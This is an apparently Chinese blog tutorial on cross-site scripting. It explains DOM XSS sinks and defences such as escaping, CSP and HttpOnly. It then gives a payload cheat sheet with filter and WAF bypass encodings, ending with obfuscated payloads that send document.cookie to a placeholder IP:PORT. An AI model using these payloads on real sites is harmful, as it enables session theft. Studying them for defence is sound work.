XSS&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;script&gt; var pos&#x3D;document.URL.indexOf(&quot;name&#x3D;&quot;)+5; document.write(decodeURI(document.URL.substring(pos,document.URL.length)));&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 获取输入函数 document.URL document.URLUnencoded document.location（及其许多属性） document.referrer window.location（及其许多属性） location location.href location.search location.hash location.pathname 输出函数 eval(…) window.execScript(…) window.setInterval(…) window.setTimeout(…) document.write(…) document.writeln(…) element.innerHTML(…) document.forms[0].action=… (and various other collections) document.attachEvent(…) document.create…(…) document.execCommand(…) document.body. … (accessing the DOM through the body object) window.attachEvent(…) document.location=… (and assigning to location’s href, host and hostname) document.location.hostname=… document.location.replace(…) document.location.assign(…) document.URL=… window.navigate(…) document.open(…) window.open(…) window.location.href=… (and assigning to location’s href, host and hostname) 总结：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。 业务逻辑1、用户的输入未经过数据库,直接拿到前台显示,比如搜索框 2、用户输入存入数据库,从数据库中取出,然后由相关的视图文件输出到网页,比如用户个人设置中的签名、用户名、用户描述等等 xss大多出现在输入框中 3、反射型xss输入在哪里输出就在那里,存储型xss输入之后存入数据库,取出数据库然后可能显示到各种地方 防御思路存储xss和反射xss1、纯前端渲染，把代码和数据分隔开。 浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。 然后浏览器执行 HTML 中的 JavaScript。 JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。 在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。 但纯前端渲染还需注意避免 DOM 型 XSS 漏洞。 2、直接使用html实体转义函数,比如php函数htmlspecialchars（）和htmlentities()、escapeHTML 1234567字符 转义后的字符&amp; &amp;&lt; &lt;&gt; &gt;&quot; &quot;&#39; &amp;#x27;&#x2F; &#x2F; 不能仅仅靠实体转义函数来防御xss，像javascript:alert(&amp;#x27;XSS&amp;#x27;)这种类型的攻击，实体转义函数就不会对其起作用。 而且实体转义函数就有局限性，因为如果数据是json格式，双引号被转义会破坏json格式。 但是我们可以使用escapeEmbedJSON() 函数，对内联 JSON 进行转义。 字符 转义后的字符 U+2028 \\u2028 U+2029 \\u2029 &lt; \\u003c 应当尽量避免自己写转义库，而应当采用成熟的、业界通用的转义库。因此html转义也完全不能避免xss攻击。 XSS 安全漏洞 简单转义是否有防护作用 HTML 标签文字内容 有 HTML 属性值 有 CSS 内联样式 无 内联 JavaScript 无 内联 JSON 无 跳转链接 无 DOM型xss在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等。 DOM 中的内联事件监听器，如 location、onclick、onerror、onload、onmouseover 等，&lt;a&gt; 标签的 href 属性，JavaScript 的 eval()、setTimeout()、setInterval() 等，都能把字符串作为代码运行。 其他思路1、充分利用 CSP，严格实施 CSP 操作，可以有效防范 XSS 攻击。 限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的； 禁止向第三方域提交数据，这样用户数据也不会外泄； 2、使用 HttpOnly 属性。避免 js 脚本操作 Cookie，即使页面被注入了恶意 JavaScript 脚本，也是无法获取到设置了 HttpOnly 的数据。因此一些比较重要的数据我们建议设置 HttpOnly 标志。 3、在用户提交时，由前端过滤输入，然后提交到后端。这种做法是不可取的。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。4、数据插入数据库,取出数据库之后进行转义,然后由视图文件输出到网页。 5、数据插入数据、取出数据库都不转义,在视图文件中进行转义 1&lt;div class=&quot;comment-content&quot;&gt;&lt;?php echo htmlspecialchars($comment[&#x27;content&#x27;];) ?&gt;&lt;/div&gt; 总结1、xss的防御不仅仅只是前端或者只是后端应该关注的问题。防范存储型和反射型 XSS 是后端的责任。而 DOM 型 XSS 攻击不发生在后端，是前端的责任。防范 XSS 是需要后端和前端共同参与的系统工程。 2、关于转义的位置不能仅仅在输入出转义，转义应该在输出 HTML 时进行，而不是在提交用户输入时。 3、html实体转义函数并不能完全防御xss。每一个转义函数转义的对象不同，因此不可能对用户的任何输入类型都进行转义。HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。 攻击思路1、如果前端限制,尝试burp抓包改包 123456# XSS-Payloadhttps://github.com/TheKingOfDuck/fuzzDicts/tree/master/easyXssPayloadhttps://github.com/ZephrFish/XSSPayloads/blob/master/raw_payloadshttps://github.com/silience/xsspayloadhttps://github.com/willc/XSSpayloads/blob/master/xss_payloads_6-20-12.txthttps://github.com/AeolusTF/XssPayload/blob/master/XssPayload.txt 2、xsspayload可以一条一条的测试,同样我们可以直接全部复制粘贴,根据弹框数字去我们的payload中找到可用的语句,同样也可以借助burp等工具fuzz测试 3、手工测试常见标签 &lt;img&gt;标签 利用方式1 12345&lt;img src&#x3D;javascript:alert(&quot;xss&quot;)&gt;&lt;IMG SRC&#x3D;javascript:alert(String.formCharCode(88,83,83))&gt;&lt;img scr&#x3D;&quot;URL&quot; style&#x3D;&#39;Xss:expression(alert(&#x2F;xss));&#39;&lt;!--CSS标记xss--&gt;&lt;img STYLE&#x3D;&quot;background-image:url(javascript:alert(&#39;XSS&#39;))&quot;&gt; XSS利用方式2 12&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;alert(1)&gt;&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;eval(&quot;alert(&#39;xss&#39;)&quot;)&gt; XSS利用方式3 1&lt;img src&#x3D;1 onmouseover&#x3D;alert(&#39;xss&#39;)&gt; &lt;a&gt;标签 标准格式 1&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&gt;baidu&lt;&#x2F;a&gt; XSS利用方式1 123&lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;aa&lt;&#x2F;a&gt;&lt;a href&#x3D;javascript:eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;&lt;a href&#x3D;&quot;javascript:aaa&quot; onmouseover&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;&gt;aa&lt;&#x2F;a&gt; XSS利用方式2 12&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&lt;a href&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;xss&#39;)&gt;aa&lt;&#x2F;a&gt; 利用方式3 1&lt;a href&#x3D;&quot;&quot; onclick&#x3D;eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt; 利用方式4 1&lt;a href&#x3D;kycg.asp?ttt&#x3D;1000 onmouseover&#x3D;prompt(&#39;xss&#39;) y&#x3D;2016&gt;aa&lt;&#x2F;a&gt; input标签 标准格式 1&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt; XSS利用方式1 1&lt;input value&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;xss&#39;) type&#x3D;&quot;text&quot;&gt; XSS利用方式2 1&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot; onmouseover&#x3D;prompt(&#39;xss&#39;) bad&#x3D;&quot;&quot;&gt; XSS利用方式3 1&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt; &lt;form&gt;标签 XSS利用方式1 12&lt;form action&#x3D;javascript:alert(&#39;xss&#39;) method&#x3D;&quot;get&quot;&gt;&lt;form action&#x3D;javascript:alert(&#39;xss&#39;)&gt; XSS利用方式2 123&lt;form method&#x3D;post action&#x3D;aa.asp? onmouseover&#x3D;prompt(&#39;xss&#39;)&gt;&lt;form method&#x3D;post action&#x3D;aa.asp? onmouseover&#x3D;alert(&#39;xss&#39;)&gt;&lt;form action&#x3D;1 onmouseover&#x3D;alert(&#39;xss)&gt; XSS利用方式3 1234&lt;!--原code--&gt;&lt;form method&#x3D;post action&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;!--base64编码--&gt;&lt;form method&#x3D;post action&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt; &lt;iframe&gt;标签 XSS利用方式1 1&lt;iframe src&#x3D;javascript:alert(&#39;xss&#39;);height&#x3D;5width&#x3D;1000 &#x2F;&gt;&lt;iframe&gt; XSS利用方式2 12345&lt;iframe src&#x3D;&quot;data:text&#x2F;html,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;iframe&gt;&lt;!--原code--&gt;&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;!--base64编码--&gt;&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt; XSS利用方式3 1&lt;iframe src&#x3D;&quot;aaa&quot; onmouseover&#x3D;alert(&#39;xss&#39;) &#x2F;&gt;&lt;iframe&gt; XSS利用方式3 1&lt;iframe src&#x3D;&quot;javascript&amp;colon;prompt&amp;lpar;&#96;xss&#96;&amp;rpar;&quot;&gt;&lt;&#x2F;iframe&gt; svg&lt;&gt;标签 1&lt;svg onload&#x3D;alert(1)&gt; 绕过思路绕过思路有很多,但是分类却有点难,实在是不知道怎么去定义每一类的绕过思路。 1、过滤关键字 大小写绕过、大小写混合 1&lt;ScRipt&gt;ALeRt(&quot;XSS&quot;);&lt;&#x2F;sCRipT&gt; 嵌套,也就是重复 1&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt; 代替 iframe就可以代替scriptconfirm和prompt可以代替alert 12345678910&lt;iframe onload=alert(1)&gt;&lt;marquee/onstart=confirm(1)&gt;&lt;details/open/ontoggle=top[&quot;al&quot;+&quot;ert&quot;](1)&gt; 谷歌浏览器 【绕阿里云XSS】&lt;svg/onload=prompt(1)&gt;&lt;style onload=alert(1)&gt;&lt;iframe src=javascript:alert`1`&gt;&lt;body onload=prompt(1);&gt;&lt;select autofocus onfocus=alert(1)&gt;&lt;script&gt;confirm(&#x27;XSS&#x27;)&lt;/script&gt;&lt;script&gt;prompt(&#x27;XSS&#x27;)&lt;/script&gt; HTML5 新增的实体命名编码 12345&amp;colon; =&gt; [冒号]&amp;NewLine; =&gt; [换行]case: &lt;a href=&quot;javasc&amp;NewLine;ript&amp;colon;alert(1)&quot;&gt;click&lt;/a&gt; 编码 HTML实体可以使用十进制与十六进制编码; javascript可以使用Unicode与八进制与十六进制进行编码. eval()函数可计算某个字符串,并执行其中的的 JavaScript 代码,可以吧js代码转化为jsunicode,jsunicode可以使用网站http://web.chacuo.net/charsetjsascii 将payload进行进制转化,十六进制前面+&amp;#x,十进制+&amp;# 对于JS编码 unicode配合js的eval函数 12 &lt;img src=&quot;1&quot; onerror=eval(&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#117;&amp;#110;&amp;#105;&amp;#99;&amp;#111;&amp;#100;&amp;#101;&amp;#39;&amp;#41;&quot;)&gt;&lt;/img&gt;&lt;img src=&quot;1&quot; onerror=eval(&quot;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0027\\u0075\\u006e\\u0069\\u0063\\u006f\\u0064\\u0065\\u0027\\u0029&quot;)&gt;&lt;/img&gt; 八进制与十六进制编码 1&lt;script&gt;eval(&quot;\\141\\154\\145\\162\\164\\50\\57\\170\\163\\163\\57\\51&quot;);&lt;/script&gt;（JS八进制编码） eval(\"\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29\");（JS十六进制编码） 12345- String.fromCharCode &#96;&#96;&#96;csharp&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;eval(String.fromCharCode(97,108,101,114,116,40,39,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,10 1,39,41))&gt;&lt;&#x2F;img&gt; data协议 1 1&lt;object data&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgnZGF0YSBwcm90b2NvbCcpPC9zY3JpcHQ+&quot;&gt;&lt;&#x2F;object&gt; 对html编码 十进制与十六进制 12&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt; （HTML实体十进制编码)&lt;img src=1 onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;&gt; (HTML实体十六进制编码) 1234567891011**js特性**| Payload | 效果 || ------------------------------------------------ | ---------------------- || &#96;&#39;alert(&quot;xss&quot;)&#39;.replace(&#x2F;.*&#x2F;g,eval)&#96; | &#96;eval(&#39;alert(&quot;xss&quot;)&#39;)&#96; || &#96;&#39;str1ng&#39;.replace(&#x2F;1&#x2F;,alert)&#96; | &#96;alert(1)&#96; || &#96;&#39;bbbalert(1)cccc&#39;.replace(&#x2F;a\\w&#123;4&#125;\\(\\d\\)&#x2F;,eval)&#96; | &#96;eval(&#39;alert(1)&#39;)&#96; |​&#96;&#96;&#96;csharp&lt;script&gt;&#39;str1ng&#39;.replace(&#x2F;1&#x2F;,alert)&lt;&#x2F;script&gt; 2、过滤符号 过滤空格 用/**/或者/12&lt;img/src=&quot;1&quot;/onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;&gt;&lt;img/**/src=&quot;1&quot;/**/onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;&gt; 3、常用函数 atob()与btoa() 1234atob(&quot;L2h0dHA6Lw==&quot;)&quot;/http:/&quot;btoa(/http:/)&quot;L2h0dHA6Lw==&quot; 在 JavaScript 中，有两个函数被分别用来处理解码和编码 base64 字符串： atob() //ASCII to Base64 btoa() //Base64 to ASCII slice() slice() 方法可从已有的数组中返回选定的元素 1arrayObject.slice(start,end) 1atob(btoa(&#x2F;http:&#x2F;)).slice(1).concat(&#x2F;IP:PORT&#x2F;).concat(eval(atob(btoa(&#x2F;docum&#x2F;)).slice(1,-1).concat(atob(btoa(&#x2F;ent.cookie&#x2F;)).slice(1,-1)))) 1&lt;svg onload&#x3D;location.href&#x3D;eval(atob(btoa(&#x2F;docu&#x2F;)).slice(1,-1).concat(atob(btoa(&#x2F;ment.cookie&#x2F;)).slice(1,-1)))&gt;","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"OWSP-TOP10","slug":"OWSP-TOP10","permalink":"http://s1eady.top/tags/OWSP-TOP10/"}]}],"categories":[{"name":"内网安全","slug":"内网安全","permalink":"http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://s1eady.top/categories/SQL%E6%B3%A8%E5%85%A5/"},{"name":"前端安全","slug":"前端安全","permalink":"http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"内网","slug":"内网","permalink":"http://s1eady.top/tags/%E5%86%85%E7%BD%91/"},{"name":"OWSP-TOP10","slug":"OWSP-TOP10","permalink":"http://s1eady.top/tags/OWSP-TOP10/"},{"name":"Cookie与Session","slug":"Cookie与Session","permalink":"http://s1eady.top/tags/Cookie%E4%B8%8ESession/"}]}